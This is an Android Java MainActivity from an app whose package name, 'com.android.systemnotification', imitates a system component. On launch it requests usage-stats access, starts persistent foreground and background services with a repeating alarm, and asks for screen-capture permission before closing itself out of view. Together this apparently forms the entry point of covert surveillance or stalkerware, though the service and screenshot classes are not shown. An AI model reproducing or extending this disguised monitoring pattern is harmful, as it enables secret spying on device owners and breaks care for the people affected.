package com.android.systemnotification;

import android.annotation.TargetApi;
import android.app.AppOpsManager;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.View;

import com.android.systemnotification.utils.Alarm;
import com.android.systemnotification.utils.BackgroundService;
import com.android.systemnotification.utils.ClassHelper;
import com.android.systemnotification.utils.ForegroundService;
import com.android.systemnotification.utils.ScreenshotManager;

import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {
    private final int REQUEST_ID = 1;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        requestUsageStatsPermission();

        ClassHelper classHelper = new ClassHelper();

        if (!classHelper.isMyServiceRunning(BackgroundService.class, this)) {

            Intent foregroundService = new Intent(this, ForegroundService.class);
            Intent backgroundService = new Intent(this, BackgroundService.class);

            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                startForegroundService(foregroundService);
            } else {
                //lower then Oreo, just start the service.
                startService(backgroundService);
            }

            Alarm alarm = new Alarm();
            alarm.setAlarm(this);
        }

        ScreenshotManager.INSTANCE.requestScreenshotPermission(MainActivity.this, REQUEST_ID);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQUEST_ID) {
            ScreenshotManager.INSTANCE.onActivityResult(resultCode, data, /*mDriveServiceHelper,*/ MainActivity.this);
        }
        finish();
    }

    void requestUsageStatsPermission() {
        if(android.os.Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP
                && !hasUsageStatsPermission(this)) {
            startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS));
        }
    }

    @TargetApi(Build.VERSION_CODES.KITKAT)
    boolean hasUsageStatsPermission(Context context) {
        AppOpsManager appOps = (AppOpsManager) context.getSystemService(Context.APP_OPS_SERVICE);
        int mode = appOps.checkOpNoThrow("android:get_usage_stats",
        android.os.Process.myUid(), context.getPackageName());
        boolean granted = mode == AppOpsManager.MODE_ALLOWED;
        return granted;
    }
}